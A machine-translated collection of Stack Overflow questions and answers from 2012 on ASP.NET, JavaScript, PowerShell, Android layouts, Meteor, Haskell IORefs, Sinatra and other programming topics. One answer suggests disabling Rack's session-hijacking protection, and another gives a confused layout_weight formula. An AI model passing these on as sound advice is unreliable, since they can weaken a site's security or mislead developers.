                    runat="server" MaxLength="4" AutoPostBack="true" OnTextChanged="Qty_Changed"></asp:TextBox>
            </ItemTemplate>
            <FooterTemplate>
                <strong>
                    <asp:Label ID="lblFooterQuantity" runat="server"></asp:Label></strong>
            </FooterTemplate>
        </asp:TemplateField>
        <asp:TemplateField HeaderText="Price" ItemStyle-HorizontalAlign="Right" HeaderStyle-HorizontalAlign="Center"
            HeaderStyle-Width="7%">
            <ItemTemplate>
                <asp:Label ID="lblPrice" runat="server" Text='<%#getConvertedPrice(Eval("Price")) %>'></asp:Label>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:TextBox ID="txtItemOwnerID" runat="server" Text='<%# Eval("ItemOwnerID") %>'
                    Visible="false"></asp:TextBox>
            </ItemTemplate>
        </asp:TemplateField>
        <asp:TemplateField HeaderText="Subtotal" ItemStyle-HorizontalAlign="Right" HeaderStyle-HorizontalAlign="Right"
            FooterStyle-HorizontalAlign="Right" HeaderStyle-Width="8%">
            <ItemTemplate>
                <asp:Label ID="lblSubTotal" runat="server" Text='<%#getConvertedPrice(Eval("Subtotal")) %>'></asp:Label>
            </ItemTemplate>
            <FooterTemplate>
                <strong>
                    <asp:Label ID="lblFooterTotalPrice" runat="server" Text="" ToolTip="Total"></asp:Label></strong>
            </FooterTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView> 
```

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-07T18:22:55.687

一个选项可能是处理 RowDataBound 并在 RowType for Header 上设置自己的 RenderMethod 并自己编写 HTML。

```
e.Row.SetRenderMethodDelegate(New RenderMethod(AddressOf RenderHeader)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:08:17.940

您是否考虑过放弃 gridview 并改用中继器控件？这会给你更多的灵活性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T11:01:36.957

我建议的最好的事情是添加一行，该行应该位于您的数据源之上，并为标题和类型/格式分别添加提供者和条款/时间表作为值。

这将为您生成所需的输出。

快乐编码！！！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T11:07:32.583

请检查以下链接。他们提供了如何在 GridView 中应用多行的解决方案。希望它能让你继续前进。

*   [真实世界的 GridView：两个 Headed & Grouping GridView](http://blogs.msdn.com/b/mattdotson/archive/2006/03/01/real-world-gridview-two-headed-grouping-gridviews.aspx)
*   [动态多行列网格标题](http://www.codeproject.com/Articles/27824/Dynamic-Multiple-Row-Column-Grid-Header)

# javascript - ReferenceError 和全局对象

> ID：10102862
> 
> 赞同：9
> 
> 时间：2012-04-11T08:59:47.410
> 
> 标签：javascript, window, referenceerror, global-object

在浏览器`window`中的 JavaScript 中是全局对象，这意味着在全局范围内定义的每个变量都是`window`. 那么为什么我会得到这个结果：

```
console.log(window.foo); // No error, logs "undefined".
console.log(foo);        // Uncaught ReferenceError: foo is not defined.
```

[小提琴](http://jsfiddle.net/qYsh6/)

那两条线应该是一样的，不是吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-04-11T09:05:06.657

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T09:04:47.080

在您的第一个示例（window.foo）中，您正在访问窗口对象的属性。当您尝试访问对象的不存在属性时，JavaScript 返回“未定义”。它就是这样设计的。

在第二个示例中，您直接引用了一个变量，并且由于它不存在，因此会引发错误。

这就是 JavaScript 的设计和工作方式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T09:07:05.013

在 JavaScript 中，您可以像这样动态分配对象字段，因此`window.foo`几乎*（参见下面的注释）*等同`var foo;` *于在全局上下文中定义时，*而只是`foo`突然调用会使浏览器恐慌，因为它甚至不知道哪个要查看的对象。请注意，如果您这样做：

```
//when in global context, 'var' sets a property on the window object
var foo;

console.log(foo);
//it will then also log `undefined` instead of throwing the error.

//if you then do:
foo = "abbazabba";

console.log(window.foo);
// it will return "abbazabba" 
```

# c# - 如何通过 c# cmdlet 在 PowerShell 中显示带有 .ps1xml 文件的嵌套对象

> ID：10102864
> 
> 赞同：1
> 
> 时间：2012-04-11T09:00:08.843
> 
> 标签：c#, powershell, cmdlets

嗨，我有分层对象结构，例如

```
 public class Department
   {
      public Guid ID {get; set;}
      public string Name{get; set;}
   }

   public class Employee
   {
      public Guid ID {get; set;}
      public string Name{get; set;}
      public Department Department {get;set;}
   } 
```

我创建了一个 formatedoutput.ps1xml 文件来在 powershell 中显示员工对象

```
<?xml version="1.0" encoding="utf-8" ?>
<Configuration>
 <ViewDefinitions>
  <View>
        <Name>EmpView</Name>
    <ViewSelectedBy>
      <TypeName>Employee</TypeName>
    </ViewSelectedBy>

  <TableControl>
    <TableHeaders>
      <TableColumnHeader>
        <Width>16</Width>
      </TableColumnHeader>
      <TableColumnHeader>
        <Width>16</Width>
      </TableColumnHeader>
      <TableColumnHeader/>
    </TableHeaders>
    <TableRowEntries>
      <TableRowEntry>
        <TableColumnItems>
          <TableColumnItem>
            <PropertyName>ID</PropertyName>
          </TableColumnItem>
          <TableColumnItem>
            <PropertyName>Name</PropertyName>
          </TableColumnItem>
          <TableColumnItem>
            <PropertyName>Department.Name</PropertyName>
          </TableColumnItem>
        </TableColumnItems>
      </TableRowEntry>
    </TableRowEntries>
  </TableControl>
 </View>
 </ViewDefinitions>
</Configuration> 
```

我已经在 PS 中使用以下 cmdlet 注册了我的 xml 文件

```
update-formatdata -prependpath c:\formatedoutput.ps1xml 
```

它显示表格输出，显示员工 ID 和姓名，但不显示部门名称。

我认为是因为它在嵌套对象中

谁能帮我显示部门名称

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T14:07:15.200

我遇到了类似的问题并来到了这个博客。对我来说，情况通过如下简单更改得到解决 - 使用 ScriptBlock 而不是 PropertyName 标记，当然，确保调试窗口中的值不为空：

```
<TableColumnItem>
    <ScriptBlock>$_.Department.Name</ScriptBlock>
</TableColumnItem> 
```

# php - 通过jquery ajax将文本区域中的内容加载到div中

> ID：10102867
> 
> 赞同：0
> 
> 时间：2012-04-11T09:00:18.080
> 
> 标签：php, jquery

我需要通过 jquery ajax 将文本区域中的内容加载到 div 中。内容最初通过 jquery 加载到 div 中。当按下按钮时，单击函数通过 ajax 将内容插入数据库，然后将内容重新加载回 div。它有效，但似乎有点零星。我的问题是，有没有更好的方法来做到这一点。

我基本上是在尝试将状态提交到时间线而不刷新页面

```
<script>
    $.ajaxSetup ({ cache: false });     
    var ajax_load = "<div align='center'><img src='img/ajax-loader.gif' alt='loading...' /></div>";
    var loadUrl = "ajax/ajax.php";
    var loadMe = "functions/status.php";
    $("#result").html(ajax_load).load(loadUrl);

    $("#share-but").click(function() {
        var status = $("textarea#status").val(); 
        $.post(
            loadMe,
            { status: status, user_id: '<?php echo "10" ?>' },
            "html"
        );
        $("#result").html(ajax_load).load(loadUrl);
        $("textarea").val('Share an update');
    });
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:17:44.973

我猜你应该在服务器响应你的 post 请求时 jquery 执行的回调函数中进行更新

因此您的代码应更改为

```
<script>
    $.ajaxSetup ({ cache: false });     
    var ajax_load = "<div align='center'><img src='img/ajax-loader.gif' alt='loading...' /></div>";
    var loadUrl = "ajax/ajax.php";
    var loadMe = "functions/status.php";
    $("#result").html(ajax_load).load(loadUrl);

    $("#share-but").click(function() {
        var status = $("#status").val(); 
        $.post(
            loadMe,
            { status: status, user_id: '<?php echo "10" ?>' },
            function(htmlData)
            {
               $("#result").html(htmlData);
               $("textarea").val('Share an update');
            },
            "html"
        );

    });
</script> 
```

因此，这里您的帖子响应是在`result`容器中设置的 html 数据

# android - android weightSum 无法正常工作

> ID：10102868
> 
> 赞同：15
> 
> 时间：2012-04-11T09:00:20.960
> 
> 标签：android, android-layout

我有一个包含三个元素的布局，它的方向是“水平的”

我想修复每个元素在我的布局中占据的大小。

第一个元素应该占据总空间的 40%，然后第二个元素应该占据 5%，第三个元素应该占据剩余的 55% 空间。

我的布局如下所示：

```
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical" >

<LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="horizontal"
    android:weightSum="100" >

    <TextView
        android:id="@+id/outletname"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="40"
        android:text="@string/outlet_name2" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="5"
        android:text=": " />

    <TextView
        android:id="@+id/outletnamevalue"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_weight="55"
        android:text="abcdefttt" />
</LinearLayout>
</LinearLayout> 
```

“TextView”中的文本会动态变化，所以我想保持元素的恒定空间，而不管视图中的内容如何......

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2012-04-11T09:03:17.010

为了使**权重**有效，您还必须将TextViews*的**宽度*设置为*0dp*。

 **```
android:layout_width="0dp" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-26T02:29:56.723

我使用这个公式：

```
layout_weight=(weightSum-PercentageYouWant*weightSum)/(TotalElements-1) 
```

> 第一个元素应该占据总空间的 40%，然后第二个元素应该占据 5%，第三个元素应该占据剩余的 55% 空间。

第一个元素：

```
(100-0.4*100)/(3-1)="30" 
```

第二个元素：

```
(100-0.05*100)/(3-1)="47.5" 
```

第三要素：

```
(100-0.55*100)/(3-1)="22.5" 
```

所以`40% + 5% + 55% = 100%`

```
layout_weight="30" + layout_weight="47.5" + layout_weight="22.5" = weightSum="100" 
```

我就是这么理解的。

这是一个示例（按钮仅供图形参考）

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:weightSum="120" >

    <!-- WeightSum=120 and I will add 4 elements, so TotalElements=4 -->

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="36"
        android:orientation="vertical" >

        <!-- I want this LinearLayout to be 10%, so (120-10%*120)/(4-1)=36 -->

        <Button
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:text="10%" />
    </LinearLayout>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="32"
        android:orientation="vertical" >

        <!-- I want this LinearLayout to be 20%, so (120-20%*120)/(4-1)=32 -->

        <Button
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:text="20%" />
    </LinearLayout>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="28"
        android:orientation="vertical" >

        <!-- I want this LinearLayout to be 30%, so (120-30%*120)/(4-1)=28 -->

        <Button
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:text="30%" />
    </LinearLayout>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_weight="24"
        android:orientation="vertical" >

        <!-- I want this LinearLayout to be 40%, so (120-40%*120)/(4-1)=24 -->

        <Button
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:text="40%" />
    </LinearLayout>

</LinearLayout> 
```**

# node.js - 如何从 Meteor 集合中获取实时的增量流，以便在 web 应用程序之外使用？

> ID：10102869
> 
> 赞同：19
> 
> 时间：2012-04-11T09:00:24.287
> 
> 标签：node.js, meteor

如何从 Meteor 集合中获取实时的增量流，以便在 web 应用程序之外使用？

我正在寻找一个初始结果集，以及对该结果集的一系列操作，在发生时交付。

谢谢，

克里斯。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-12T09:07:42.467

Meteor 协议称为 DDP。它完全符合您的要求：您发送一条“订阅”消息，说明您想要获取的数据，然后您返回初始结果集，然后是创建/更新/删除消息流。

因此，您需要一个 DDP 客户端，用于编写其他程序的任何语言。由于 Meteor 是如此新，因此这些还不存在。但是很多人已经写信说他们想写它们。如果您有兴趣参与其中，请发送消息至contact@meteor.com。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-11T08:45:33.157

他们只是添加了一个小型[python 命令行工具](https://github.com/meteor/meteor/tree/devel/examples/unfinished/python-ddp-client)来与 Meteor DDP 服务器通信。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-07T00:12:00.963

Geoff 是对的，但是当我搜索相同的解决方案时，我发现两个使用 Javascript

*   依赖于 jQuery [https://github.com/eddflrs/meteor-ddp](https://github.com/eddflrs/meteor-ddp)（推荐）
*   一个轻量级的独立解决方案[https://github.com/bmcmahen/ddp-sockjs-client](https://github.com/bmcmahen/ddp-sockjs-client)

希望两者都使用 ddp [https://github.com/meteor/meteor/blob/master/packages/livedata/DDP.md的规范](https://github.com/meteor/meteor/blob/master/packages/livedata/DDP.md)

# c# - 创建excel表并将数据写入其中

> ID：10102872
> 
> 赞同：0
> 
> 时间：2012-04-11T09:00:50.427
> 
> 标签：c#, c#-4.0

我正在用 c# 将数据写入 Excel 工作表。

我编写了以下代码。

```
 string excel_filename = @"C:\Users\Downloads\bookmain.xlsx";
        Excel.Application excel = new Excel.Application();
        excel.Visible = true;
        Excel.Workbook wb = excel.Workbooks.Open(excel_filename);
        Excel.Worksheet sh = wb.Sheets.Add(); 
        sh.Name = "TestSheet"; 
        sh.Cells[1, "A"].Value2 = "SNO";
        sh.Cells[1, "B"].Value2 = "Name";
        sh.Cells[1, "C"].Value2 = "ID";
        for (int i = 0; i < 2; i++)
        {
            sh.Cells[i+2, "A"].Value2 = "1";
            sh.Cells[i+2, "B"].Value2 = "A";
            sh.Cells[i+2, "C"].Value2 = "1122"; 
        }

        wb.Save();
        excel.Quit(); 
```

这里我给出了已经存在且为空的excel文件的路径。

如何更改此代码，当我给出路径时它应该自动检查，如果它存在它必须创建否则不需要创建。

即使我的代码也需要检查工作表名称，它存在我将直接编辑它，否则我需要创建一个新工作表。

任何人都可以分享他们的回应。

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T09:09:18.917

检查文件是否存在：

```
if(!File.Exists(excel_filename)) 
{
  //if not exists then only create:- 
} 
```

对于检查工作表，您可以这样做：

```
foreach (Sheet sheet in workbook.Sheets)
{
    if (sheet.Name.equals("Test"))
    {
        //do something
    }
} 
```

**更新：** 这是它的工作原理：

# 创建 Excel 对象

```
Excel.Application excel = new Excel.Application(); 
```

# 使 Excel 可见

```
excel.visible = true 
```

# 添加工作表

```
Excel.Worksheet sh = wb.Sheets.Add(); 
```

# 另存为

```
 wb .SaveAs( @"C:\Users\Downloads\bookmain.xlsx",
            Excel.XlFileFormat.xlXMLSpreadsheet, missing, missing,
            false, false, Excel.XlSaveAsAccessMode.xlNoChange,
            missing, missing, missing, missing, missing); 
```

# cygwin - 在 openssl 中使用 cygwin 和 mingw 对 `_WinMain@16' 的未定义引用

> ID：10102873
> 
> 赞同：1
> 
> 时间：2012-04-11T09:00:55.490
> 
> 标签：cygwin, openssl, mingw, winmain

我有点在这里与 OpenSSL 作斗争。我下载了当前版本 1.0.1 并且编译本身可以工作。我什至可以调用 ./apps/openssl.exe。但是当我进入链接过程时，链接器会抱怨：

```
/usr/i686-pc-mingw32/sys-root/mingw/lib/libmingw32.a(main.o): In function `main':
/usr/src/mingw-runtime/mingw-runtime-3.20-1/src/mingwrt-3.20-mingw32/main.c:73: undefined reference to `_WinMain@16' 
```

（这是如果我在 cygwin 中使用 mingw，cygwin 本身也会发生同样的错误）这是 cygwin 错误：

```
/usr/lib/gcc/i686-pc-cygwin/3.4.4/../../../libcygwin.a(libcmain.o):(.text+0xba): undefined reference to `_WinMain@16' 
```

现在我发现这意味着它没有找到 main 函数，但这实际上不可能，是吗？我的意思是 openssl 有它的主要功能。关于 mingw：我找不到它提到的那个文件，所以可能是错误的原因，但是 libcygwin.a 确实存在（尽管我不知道如何确定它是否具有主要功能）。

所以基本上我问：为什么会出现这个错误，只有在我不添加主函数的情况下才会出现。我错过了什么？

编辑：很抱歉错过了：我在 Win 7 x64 Enterprise

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-03T12:54:58.073

请参阅[此解决方案](http://www.mail-archive.com/mingw-w64-public@lists.sourceforge.net/msg01519.html)。步骤总结如下：

1.  解压缩 .tar 与`msys tools`而**不是**7-zip。

2.  使用`tar -xzf openssl-x.y.z.tar`xyz 表示您的版本。

3.  然后运行命令，它会像魅力一样工作。

# asp.net-mvc - 简单复制站点时，没有为此对象定义无参数构造函数

> ID：10102876
> 
> 赞同：0
> 
> 时间：2012-04-11T09:01:04.437
> 
> 标签：asp.net-mvc, structuremap, asp.net-mvc-4, iis-express

我收到上述错误。我所做的只是复制现有站点并设置调试以使用 Visual Studio 中的 IISExpress 使用不同的端口。

任何想法为什么我会突然收到这个错误？通常，当 StructureMap 由于某种原因无法解析依赖项以注入控制器时，我会收到此错误。但这让我很难过。代码库是相同的。我所做的只是将代码复制到另一个文件夹中！？！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T11:27:08.400

这需要一段时间才能弄清楚。基本上，卸载 Mvc4 beta 解决了它。一定有一些对 Mvc4 的推断引用破坏了代码。代码库**完全相同**，但整个应用程序都崩溃了。应用程序仍在工作的文件夹可能以某种方式保留了对 Mvc3 的一些旧引用。

# haskell - Haskell：“atomicModifyIORef”是如何工作的？

> ID：10102881
> 
> 赞同：27
> 
> 时间：2012-04-11T09:01:14.663
> 
> 标签：haskell, concurrency, locking, atomic, compare-and-swap

有人可以解释如何[`atomicModifyIORef`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-IORef.html#v%3aatomicModifyIORef)工作吗？尤其：

（1）它是等待锁定，还是乐观地尝试并在存在争用时重试（如`TVar`）。
(2) 为什么 的签名与[`atomicModifyIORef`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-IORef.html#v%3aatomicModifyIORef)的签名不同[`modifyIORef`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-IORef.html#v%3aatomicModifyIORef)？特别是，这个额外的变量是什么`b`？

**编辑：**我想我已经找到了（2）的答案，因为这`b`是一个要提取的值（如果不需要，这可以是空的）。在单线程程序中，知道该值是微不足道的，但在多线程程序中，人们可能想知道在应用函数时之前的值是什么。我认为这就是为什么`modifyIORef`没有这个额外的返回值（因为这种返回值的用法`modifyIORef`可能无论如何都应该使用`atomicModifyIORef`。我仍然对（1）的答案感兴趣。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-04-11T12:41:29.450

> 它是等待锁定，还是乐观地尝试并在存在争用时重试（如 TVar）。

atomicModifyIORef 在您所在的底层硬件架构上使用锁定指令，以原子方式交换指向已分配 Haskell 对象的指针。

在 x86 上，它使用 cas 指令，作为原始语言暴露给 via `atomicModifyMutVar#`，它在 Cmm 中作为运行时服务实现为：

```
stg_atomicModifyMutVarzh
{
...

 retry:
   x = StgMutVar_var(mv);
   StgThunk_payload(z,1) = x;
#ifdef THREADED_RTS
   (h) = foreign "C" cas(mv + SIZEOF_StgHeader + OFFSET_StgMutVar_var, x, y) [];
   if (h != x) { goto retry; }
#else
   StgMutVar_var(mv) = y;
#endif
...
} 
```

也就是说，它将尝试进行交换，否则重试。

cas 作为原语的实现展示了我们如何深入到金属：

```
/*
 * Compare-and-swap.  Atomically does this:
 */
EXTERN_INLINE StgWord cas(StgVolatilePtr p, StgWord o, StgWord n);

/*
 * CMPXCHG - the single-word atomic compare-and-exchange instruction.  Used
 * in the STM implementation.
 */
EXTERN_INLINE StgWord
cas(StgVolatilePtr p, StgWord o, StgWord n)
{
#if i386_HOST_ARCH || x86_64_HOST_ARCH
    __asm__ __volatile__ (
      "lock\ncmpxchg %3,%1"
          :"=a"(o), "=m" (*(volatile unsigned int *)p)
          :"0" (o), "r" (n));
    return o;
#elif arm_HOST_ARCH && defined(arm_HOST_ARCH_PRE_ARMv6)
    StgWord r;
    arm_atomic_spin_lock();
    r  = *p;
    if (r == o) { *p = n; }
    arm_atomic_spin_unlock();
    return r;
#elif !defined(WITHSMP)
    StgWord result;
    result = *p;
    if (result == o) {
        *p = n;
    }
    return result; 
```

所以你可以看到它能够在 Intel 中使用原子指令，在其他架构上将使用不同的机制。运行时将重试。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-04-11T09:21:20.627

`atomicModifyIORef`接受一个`r :: IORef a`和一个函数`f :: a -> (a, b)`并执行以下操作：

它读取 的值`r`并应用于`f`该值，产生`(a',b)`。然后`r`用新值更新，`a'`而`b`返回值。这种读写访问是原子完成的。

当然，这种原子性只有在*所有*访问`r`都通过`atomicModifyIORef`. 请注意，您可以通过查看来源 [1] 找到此信息。

[1] [https://hackage.haskell.org/package/base-4.12.0.0/docs/Data-IORef.html#v:atomicModifyIORef](https://hackage.haskell.org/package/base-4.12.0.0/docs/Data-IORef.html#v:atomicModifyIORef)

# objective-c - Cocoa - NSCoding 保存在哪里？

> ID：10102891
> 
> 赞同：0
> 
> 时间：2012-04-11T09:01:51.037
> 
> 标签：objective-c, cocoa, nscoding

NSCoding 协议的默认保存位置是什么？

另外，有什么方法可以将这样的默认位置更改为 .app 文件所在的文件夹？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:06:30.850

您可以使用 NSKeyedArchiver 直接将根据 NSCoding 编码的编码对象数据写入文件

像这样：

```
BOOL result = [NSKeyedArchiver archiveRootObject:yourObject toFile:filename]; 
```

`filename`您可以选择文件位置（如果您在 iOS 上，可以将其设置为文档目录）。

**编辑 1：** 如果您想存储到 NSUserDefault... 中，请执行以下操作：

```
NSData *yourObjectAsNSData = [NSKeyedArchiver archivedDataWithRootObject:yourObject];
[[NSUserDefaults standardUserDefaults] setObject:yourObjectAsNSData forKey:@"aKey"] 
```

# internet-explorer - 使用 omniauth 的 Sinatra 应用程序在 ie9 中获取 Rack::Protection::SessionHijacking

> ID：10102893
> 
> 赞同：6
> 
> 时间：2012-04-11T09:02:23.943
> 
> 标签：internet-explorer, sinatra, omniauth, rack

我有一个 Sinatra 应用程序，它使用了omniauth，它不断地得到这个错误

```
attack prevented by Rack::Protection::SessionHijacking 
```

当我尝试登录（使用谷歌帐户）时。

它在其他版本的 IE 和 chrome/firefox/safari 上运行良好。

我的设置是

```
rack (1.4.1)
rack-force_domain (0.2.0)
rack-protection (1.2.0)

sinatra (1.3.2)
  rack (~> 1.3, >= 1.3.6)
  rack-protection (~> 1.2)
  tilt (~> 1.3, >= 1.3.3)
omniauth (1.0.3)
  hashie (~> 1.2)
  rack

omniauth-google-oauth2 (0.1.9)
  omniauth (~> 1.0)
  omniauth-oauth2
omniauth-oauth2 (1.0.0)
  oauth2 (~> 0.5.0)
  omniauth (~> 1.0) 
```

有谁知道为什么会这样？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T09:12:40.040

这个模块跟踪像 USER_AGENT 和类似的属性（你可以在这里查看它们：[https](https://github.com/rkh/rack-protection/blob/master/lib/rack/protection/session_hijacking.rb) ://github.com/rkh/rack-protection/blob/master/lib/rack/protection/session_hijacking.rb ）。您收到的此错误可能是由于在会话期间更改了这些属性之一。尝试测试在禁用此模块的情况下是否一切正常：

```
set :protection, except: :session_hijacking 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-18T06:56:10.337

您可以尝试将您的机架保护 gem 升级到 v1.5.2 或 1.5.3（最新）。

他们从 session_hijacking 库中删除了对 HTTP_ACCEPT_ENCODING 的跟踪。

# java - 如何从Java中的线程获取所有子线程？

> ID：10102894
> 
> 赞同：4
> 
> 时间：2012-04-11T09:02:38.543
> 
> 标签：java, multithreading

我正在开发一个允许客户在 java 中编写自己的代码的框架。这个框架在一个线程（比如说线程 A）中调用他们的代码来做定制的事情。

但是客户可以在他们的代码中创建新线程。那么问题是如何知道所有客户代码的线程已完成？或者如何禁止客户在他们的代码中创建线程？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:17:22.390

您可以为客户端代码创建一个新的[ThreadGroup](http://docs.oracle.com/javase/7/docs/api/java/lang/ThreadGroup.html)。该`activeCount`方法告诉您在给定时刻有多少客户端线程处于活动状态，并且该`enumerate`方法允许您枚举线程。要等待整个组的终止，您可以枚举线程并调用`join`每个线程。

如果您想禁止创建新线程，我相信您可以使用 custom 来实现`SecurityManager`，但我不知道细节。

# c# - C# - 在另一个字符串中找到一组字符串中的一个的最快方法

> ID：10102896
> 
> 赞同：6
> 
> 时间：2012-04-11T09:02:53.247
> 
> 标签：c#, .net, regex, string

我需要检查一个字符串是否包含任何脏话。

根据此处另一个问题的一些建议，我制作了一个包含以下单词的 HashSet：

```
HashSet<string> swearWords = new HashSet<string>() { "word_one", "word_two", "etc" }; 
```

现在我需要查看其中包含的任何值`swearWords`是否在我的字符串中。

我已经看到它以相反的方式完成，例如：

```
swearWords.Contains(myString) 
```

但这将返回错误。

检查 HashSet 中的任何单词是否在中的最快方法是`myString`什么？

注意：我想我可以使用 foreach 循环依次检查每个单词，如果找到匹配项则中断，我只是想知道是否有更快的方法。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-11T09:05:18.317

如果你把你的誓言放在一个 IEnumerable<> 实现容器中：

```
var containsSwears = swarWords.Any(w => myString.Contains(w)); 
```

注意：HashSet<> 实现 IEnumerable<>

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-11T09:06:21.217

您可以尝试正则表达式，但我不确定它是否更快。

```
Regex rx = new Regex("(" + string.Join("|", swearWords) + ")");
rx.IsMatch(myString) 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-04-11T09:10:49.283

如果你有大量的脏话，你可以使用 Aho–Corasick 算法：[http ://tomasp.net/blog/ahocorasick.aspx](http://tomasp.net/blog/ahocorasick.aspx)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-04-11T09:20:37.410

这种方案的主要问题*是在您要检查的字符串的上下文中定义一个词是什么*。

*   幼稚的实现，例如使用`input.Contains`简单的实现，没有单词的概念；即使这不是意图，他们也会“发现”脏话。
*   在空格上打断单词不会减少它（还要考虑标点符号等）。
*   打破除空格以外的字符会引发文化问题：究竟哪些字符被认为是单词字符？

假设您的停用词列表仅使用拉丁字母，一个实际的选择是假设单词是仅由拉丁字符组成的序列。所以一个合理的起始解决方案是

```
var words = Regex.Split(@"[^\p{Ll}\p{Lu}\p{Lt}\p{Lo}\p{Pc}\p{Lm}]", myString); 
```

`\W`上面的正则表达式是修改为不包含数字的标准类；有关详细信息，请参阅[http://msdn.microsoft.com/en-us/library/20bw873z.aspx](http://msdn.microsoft.com/en-us/library/20bw873z.aspx)。对于其他方法，请参阅[此问题](https://stackoverflow.com/questions/5687357/splitting-a-string-into-words-in-a-culture-neutral-way)以及可能在接受的答案中提供的 CodeProject 链接。

拆分输入字符串后，您可以迭代`words`并替换与列表中任何内容匹配的那些（用于`swearWords.Contains(word)`检查）或简单地检测是否有任何匹配项

```
var anySwearWords = words.Intersect(swearWords).Any(); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-04-11T09:07:34.313

您可以将“myString”拆分为 IEnumerable 类型，然后对它们使用“Overlaps”？

[http://msdn.microsoft.com/en-us/library/bb355623(v=vs.90).aspx](http://msdn.microsoft.com/en-us/library/bb355623(v=vs.90).aspx)

（PS好久不见……）

**编辑**：刚刚注意到我之前的回答中的错误。

# c# - 将阿拉伯语消息导出到 ASP.NET 网站中的 excel

> ID：10102897
> 
> 赞同：1
> 
> 时间：2012-04-11T09:03:00.370
> 
> 标签：c#, asp.net, arabic

我有一个网站，它以阿拉伯语存储一些消息。当我尝试将其导出到 csv 或 excel 时，它是什么？. 下面是我用来导出它的代码

```
public void DownloadCSV(string csvData, string filename)
{
    string strFileName = filename;
    HttpContext.Current.Response.ClearContent();
    HttpContext.Current.Response.AddHeader("content-disposition", "attachment; filename=" + strFileName);
    HttpContext.Current.Response.ContentEncoding = System.Text.Encoding.GetEncoding("iso-8859-2");
    HttpContext.Current.Response.ContentType = "application/vnd.ms-excel";
    HttpContext.Current.Response.Write(csvData);
    HttpContext.Current.Response.Flush();
    HttpContext.Current.Response.End();
} 
```

怎么能解决这个问题。提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T11:41:18.743

将 ContentEncoding 更改为 windows-1256 或 utf-8。此外，最好使用更好的库来创建 excel 文件，例如[http://epplus.codeplex.com/](http://epplus.codeplex.com/)

# p2p - 连接两个客户端套接字

> ID：10102899
> 
> 赞同：0
> 
> 时间：2012-04-11T09:03:06.097
> 
> 标签：p2p

我有一个具有客户端和服务器的应用程序。服务器基本上只用来存储客户端的文件名，这样当其他客户端要搜索文件时，他们可以去服务器，找到有自己想要的文件的客户端，直接连接接收文件. 到目前为止，我可以获取具有其他客户端请求的文件的客户端的套接字信息。但是，我现在对如何连接这两个客户端感到困惑。我是否必须在两个客户端之间创建一个单独的客户端和一个服务器套接字，或者还有其他方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:18:08.647

现在你有两个选择：-

1.  让服务器继续他的角色，服务器可以充当双方之间的中介。它应该从拥有该文件的客户端下载该文件并将其（通过任何合适的协议）发送给请求该文件的客户端。这称为客户端-服务器架构。这是一种简单的方法，您可以获得文件缓存等好处。即，如果将来请求相同的文件，服务器可以直接发送它而无需请求客户端。

2.  您可以继续使用 P2P 架构，并在双方之间创建一个单独的套接字，这并不简单，并且在多个进程同时工作时需要特别小心。

# excel - 如何使 =GETPIVOTDATA 更 具动态性？

> ID：10102902
> 
> 赞同：2
> 
> 时间：2012-04-11T09:03:17.107
> 
> 标签：excel, excel-formula, excel-2003, pivot-table

